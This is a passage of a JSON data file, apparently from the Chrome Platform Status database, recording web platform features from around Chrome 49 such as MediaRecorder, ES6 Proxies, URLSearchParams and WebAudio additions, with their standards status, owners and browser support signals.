    "summary": "Change Event.timeStamp to be a DOMHighResTimeStamp which is a high resolution monotonic time with microseconds resolution instead DOMTimeStamp which is an  epoch time with millisecond resolution. For input events, the timestamp value will represent the underlying OS timestamp for the event. High resolution monotonic timestamp for input events enables new functionality such as accurate measurement of pointer velocity, simple input latency measurements, and etc.\r\n\r\n",
    "id": 5523910145605632,
    "resources": {
      "docs": [
        "https://github.com/whatwg/dom/issues/23",
        "https://lists.w3.org/Archives/Public/public-whatwg-archive/2014May/0055.html"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/event-timestamp/index.html",
        "http://rbyers.net/scroll-latency.html"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-12-07 17:01:45.519090",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: WebFonts use adaptive timeouts to take fallback fonts",
    "tags": [
      "Font",
      "Fonts",
      "WebFont",
      "WebFonts",
      "Intervention",
      "User Agent Intervention"
    ],
    "comments": "Chrome 49, the feature is enabled as a User-Agent Intervention. 2G Cellular connection will trigger the intervention.\r\n\r\nChrome 53, network quality estimator has been used to trigger the intervention on effectively slow networks. This estimator-based intervention was enabled by default in Chrome 59.\r\n\r\nDeveloper tools shows a warning message when the intervention is triggered for each font. Web site owners can opt-out from the intervention by setting CSS font-display to other than 'auto'.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://tabatkins.github.io/specs/css-font-display/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 49
        },
        "owners": [
          "toyoshim@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 49,
        "blink_components": [
          "Blink>Fonts"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "http://crbug.com/578029",
        "intervention": true
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Originally, Blink use fallback fonts if the font loading isn't finished in 3 seconds. But this timeout value wasn't defined in any spec.\r\n\r\nBlink changes this timeout adaptively to improve performance on slow connections.\r\n\r\nIf font-display feature is enabled, this change happens only if 'auto' is specified to follow the font-display spec. Otherwise, it happens always.\r\n\r\nThe definition of slow connection would be changed in the field trial.",
    "id": 5636954674692096,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face/font-display"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:08.502150",
      "by": "ericbidelman@google.com"
    },
    "name": "MediaRecorder",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/mediastream-recording/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=803414",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "mcasas@chromium.org",
          "niklase@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=261321",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "url": "http://www.w3.org/TR/mediastream-recording/",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Encode audio and video streams in the browser.",
    "id": 5929649028726784,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaRecorder_API",
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaRecorder"
      ],
      "samples": [
        "https://webrtc.github.io/samples/src/content/getusermedia/record/",
        "https://simpl.info/mr"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:31.288680",
      "by": "ericbidelman@google.com"
    },
    "name": "Navigator.getStorageUpdates()",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 49
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://crbug.com/465255",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The getStorageUpdates() method for Navigator is no longer in the spec, and is a no-op.",
    "id": 4780366799831040,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:31.761160",
      "by": "ericbidelman@google.com"
    },
    "name": "Promise rejection tracking events",
    "tags": [
      "promises",
      "javascript"
    ],
    "comments": "Compare with Node.js: https://nodejs.org/api/process.html#process_event_unhandledrejection",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/webappapis.html#unhandled-promise-rejections",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-whatwg-archive/2015May/0055.html",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "jochen@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=495801",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Introduces a pair of events on the global objects, unhandledrejection and rejectionhandled, for tracking promise rejections.",
    "id": 4805872211460096,
    "resources": {
      "samples": [
        "https://googlechrome.github.io/samples/promise-rejection-events/index.html",
        "https://jsbin.com/vewagenoku/edit?html%2Coutput"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:31.820410",
      "by": "ericbidelman@google.com"
    },
    "name": "Proxies (ES6)",
    "comments": "https://code.google.com/p/v8/issues/detail?id=1543",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://tc39.github.io/ecma262/#sec-proxy-object-internal-methods-and-internal-slots",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "rossberg@chromium.org",
          "neis@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/proxieses6",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Proxies are objects for which the programmer has to define the semantics in JavaScript. ",
    "id": 4811188005240832,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/proxies-es6/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:10.027100",
      "by": "ericbidelman@google.com"
    },
    "name": "Reflect (ES6)",
    "tags": [
      "ES6",
      "reflection",
      "javascript"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-reflection",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=987514",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "neis@chromium.org",
          "caitpotter88@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3931",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-reflect-api",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Improved imperative methods for invoking, examining or modifying values at runtime.",
    "id": 6060641169178624,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:34.580900",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove Non-standard getComputedStyle(e).css* behaviour",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 49
        },
        "owners": [
          "suzyh@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "ios": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://crbug.com/413205",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "getComputedStyle(e).css* (except for .cssFloat) is non-standard behaviour that only Blink and WebKit support. In all cases it is aliased by getComputedStyle(e).*. We are proposing to deprecate and remove this functionality in an upcoming release.",
    "id": 5006796888473600,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:26:42.676270",
      "by": "ericbidelman@google.com"
    },
    "name": "Service Worker: WindowClient.navigate()",
    "tags": [
      "service worker",
      "sw",
      "navigate",
      "window client",
      "client"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/service-workers/#client-navigate-method",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "jinho.bang@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "http://crbug.com/500911",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The method can instruct a controlled window client to navigate to a different url.",
    "id": 5314750808326144,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/WindowClient/navigate"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/service-worker/windowclient-navigate/index.html"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:07.421920",
      "by": "ericbidelman@google.com"
    },
    "name": "Sloppy mode block bindings (let, class, const, function) (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/ECMAScript_6_support_in_Mozilla",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "littledan@chromium.org",
          "rossberg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/dn263046",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Enable ES6-style block-scoped bindings including let and class in sloppy mode, and modify semantics of const and function to operate according to ES6 in sloppy mode.",
    "id": 5891733057437696,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/const",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/class"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-26 08:13:17.436570",
      "by": "Patket@microsoft.com"
    },
    "name": "Symbol.toStringTag (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-symbol.tostringtag",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1114580",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "adamk@chromium.org",
          "caitpotter88@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=3502",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=150696",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Using Symbol.toStringTag, user-defined types can return customized output when passed to Object.prototype.toString (either directly or as a result of string coercion) by storing a descriptive string in a Symbol.toStringTag-keyed property.",
    "id": 5758145364230144,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-04-26 08:12:22.315420",
      "by": "Patket@microsoft.com"
    },
    "name": "URLSearchParams",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://url.spec.whatwg.org/#interface-urlsearchparams",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=887836",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "mkwst@chromium.org",
          "sigbjornf@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://crbug.com/303152",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The URLSearchParams interface allows developers to (shock!) manipulate the search params of a URL. It also provides a mechanism to POST data via `fetch()` with a urlencoded body vs. the multipart body that `FormData` produces.",
    "id": 5632984866619392,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams",
        "https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams/append"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/urlsearchparams/index.html"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 08:12:02.615700",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio:  Add IIRFilterNode",
    "comments": "The general idea of an IIRFilterNode has been agreed upon in the W3C WebAudio WG.  The exact specification of the node is being reviewed.  Implementation will, of course, match the final specification.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "ios": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "http://crbug.com/514782",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Add a new node, IIRFilterNode, that implements a general IIR filter.  The coefficients are fixed at creation and not changeable with no automation functions allowed.",
    "id": 6674104937611264,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#the-iirfilternode-interface",
        "https://github.com/WebAudio/web-audio-api/issues/323",
        "https://github.com/WebAudio/web-audio-api/pull/556"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 08:11:05.631560",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio: OfflineAudioContext.suspend() and resume()",
    "tags": [
      "Web Audio API",
      "OfflineAudioContext",
      "Suspend",
      "Resume",
      "Graph Manipulation",
      "Progress"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/#the-offlineaudiocontext-interface",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "hongchan@chromium.org",
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "ios": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=497933",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Adds suspend() and resume() feature in OfflineAudioContext to support the synchronous graph manipulation with the render block precision (k-rate) in the non-realtime audio rendering. ",
    "id": 5294442458120192,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 08:10:23.017120",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio: decodeAudioData returns a Promise",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "ios": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "http://crbug.com/420107",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "AudioContext.decodeAudioData returns a Promise<AudioBuffer> that is resolved when decoding the audio data is finished.  This is in addition to the existing callbacks, which are now optional.",
    "id": 5645042685313024,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#widl-AudioContext-decodeAudioData-Promise-AudioBuffer--ArrayBuffer-audioData-DecodeSuccessCallback-successCallback-DecodeErrorCallback-errorCallback",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioContext/decodeAudioData"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:17.129970",
      "by": "ericbidelman@google.com"
    },
    "name": "WebRTC API for choosing key pair algorithm (RSA, ECDSA) for certificates used in DTLS handshake",
    "tags": [
      "RSA",
      "ECDSA",
      "RTCCertificate",
      "RTCPeerConnection.generateCertificate",
      "RTCConfiguration.certificates"
    ],
    "comments": "The following links demonstrate that these calls actually shipped in 49.\r\n\r\n\r\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=528250#c27\r\nhttps://storage.googleapis.com/chromium-find-releases-static/731.html#7318c1bfd0b0d45bc323bc4bcc45c98c4aeebfb6",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/webrtc-pc/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1172785",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "hbos@chromium.org",
          "torbjorng@chromium.org",
          "tommi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "http://crbug.com/528250",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A WebRTC JavaScript API is added to control the key pair algorithm (RSA, ECDSA) to use for the self-signed certificates generated when DTLS is used for peerconnections.\r\n\r\nChanges to API surface: RTCCertificate class added, RTCPeerConnection.generateCertificate static method added, RTCConfiguration.certificates (sequence<RTCCertificate>) member added.\r\n\r\nThis feature was behind a flag starting in Chrome 48 and Opera 35. Earlier, this feature was erroneously marked as shipping in M52",
    "id": 6669539118940160,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCCertificate",
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/generateCertificate"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-19 18:18:07.665140",
      "by": "jmedley@google.com"
    },
    "name": "addEventListener/removeEventListener EventListenerOptions API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1287706",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "dtapuska@chromium.org",
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "http://crbug.com/543685",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/eventlisteneronceoption/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add an additional API to addEventListener/removeEventListener which takes EventListenerOptions dictionary.\r\n\r\nvoid [add|remove]EventListener(DOMString type, EventListener listener, EventListenerOptions options);\r\n\r\nCurrently other platforms (Gecko) add additional booleans to the argument list to modify the behavior of the added event listeners. We'd like to turn this into a dictionary (EventListenerOptions) so that is a more flexible API for future work.\r\n",
    "id": 5718574840676352,
    "resources": {
      "docs": [
        "https://github.com/whatwg/dom/pull/82",
        "https://github.com/RByers/EventListenerOptions",
        "https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener",
        "https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/removeEventListener"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:45.538070",
      "by": "ericbidelman@google.com"
    },
    "name": "addEventListener/removeEventListener non-optional arguments",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#interface-eventtarget",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://crbug.com/353484",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "For a very long time, the first two arguments (type and listener) of addEventListener and removeEventListener have been optional, where they are non-optional in the spec and other browsers. This will change, so that calling these methods with zero or one argument will start to throw exceptions.",
    "id": 5640816202612736,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener",
        "https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/removeEventListener"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/event-listeners-mandatory-arguments/index.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:28.082590",
      "by": "ericbidelman@google.com"
